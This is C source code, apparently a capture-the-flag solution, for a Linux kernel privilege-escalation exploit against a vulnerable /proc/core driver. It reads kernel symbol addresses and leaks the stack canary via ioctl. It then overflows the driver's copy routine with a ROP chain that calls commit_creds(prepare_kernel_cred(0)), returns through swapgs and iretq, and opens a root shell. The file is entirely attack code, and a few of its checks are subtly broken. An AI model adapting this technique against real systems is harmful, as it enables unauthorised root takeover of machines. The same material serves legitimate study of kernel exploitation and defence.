#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define DEV_CORE "/proc/core"

#define KERNELCALL __attribute__ ((regparm(3)))
void (* commit_creds)(void *) KERNELCALL;
size_t* (* prepare_kernel_cred)(void *) KERNELCALL;

void info(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[.] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void fail(const char *fmt, ...) {
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[x] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
        info("saving status...\n");
        __asm__("mov user_cs, cs;"
                        "mov user_ss, ss;"
                        "mov user_sp, rsp;"
                        "pushf;"
                        "pop user_rflags;"
                        );
        msg("status has been saved\n");
}

void get_shell(){
        msg("shell?\n");
        char *shell = "/bin/sh";
        char *args[] = {shell,NULL};
        execve(shell,args,NULL);
}

size_t commit_creds_addr=0,prepare_kernel_cred_addr=0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;

void get_root(){
	commit_creds = commit_creds_addr;
	prepare_kernel_cred = prepare_kernel_cred_addr;
	commit_creds(prepare_kernel_cred(0));
}


void find_symbols(){
	FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
	char buf[0x30]={0};

	if(kallsyms_fd < 0){
		fail("open kallsyms error!\n");
		exit(0);
	}
	while(fgets(buf, 0x30, kallsyms_fd)){
		if(commit_creds_addr & prepare_kernel_cred_addr)
			return;
		if(strstr(buf,"commit_creds") && !commit_creds_addr){
			char hex[20]={0};
			strncpy(hex,buf,16);
			sscanf(hex,"%lx",&commit_creds_addr);
			msg("commit_creds addr: %p\n", commit_creds_addr);
			vmlinux_base = commit_creds_addr - 0x9c8e0;
			msg("vmlinux_base addr: %p\n", vmlinux_base);
		}
		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred_addr){
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%lx", &prepare_kernel_cred_addr);
			msg("prepare_kernel_cred addr: %p\n", prepare_kernel_cred_addr);
			vmlinux_base = prepare_kernel_cred_addr - 0x9cce0;
		}
	}
	if(!(prepare_kernel_cred_addr & commit_creds_addr)){
		fail("error !\n");
		exit(0);
	}
}

void set_off(int fd,size_t idx){
	info("set off: 0x%lx\n",idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd,char* buf){
	info("reading buf ...\n");
	ioctl(fd, 0x6677889B, buf);
}

void core_copy_func(int fd,size_t size){
	info("copying from user: 0x%lx\n",size);
	ioctl(fd, 0x6677889A, size);
}

size_t swapgs = 0xffffffff81a012da; //swapgs; popfq; ret;
size_t iretq = 0xffffffff81050ac2; //iretq; ret;

int main(){
	
	find_symbols();
	size_t offset = vmlinux_base - raw_vmlinux_base;
	save_status();

	int fd = open(DEV_CORE,O_RDWR);
	info("leaking canary ...\n");
	set_off(fd,0x40);
	size_t buf[0x40]={0};
	core_read(fd,buf);
	size_t canary = buf[0];
	msg("canary:%p\n", canary);

	size_t rop[0x30]={0};
	rop[8] = canary;
	rop[10] = (size_t)get_root;
	rop[11] = swapgs + offset;
	rop[12] = 0;
	rop[13] = iretq + offset;
	rop[14] = (size_t)get_shell;
	rop[15] = user_cs;
	rop[16] = user_rflags;
	rop[17] = user_sp;
	rop[18] = user_ss;

	write(fd,rop,0x30*8);
	core_copy_func(fd,0xffffffffffff0000|(0x30*8));

	return 0;
}
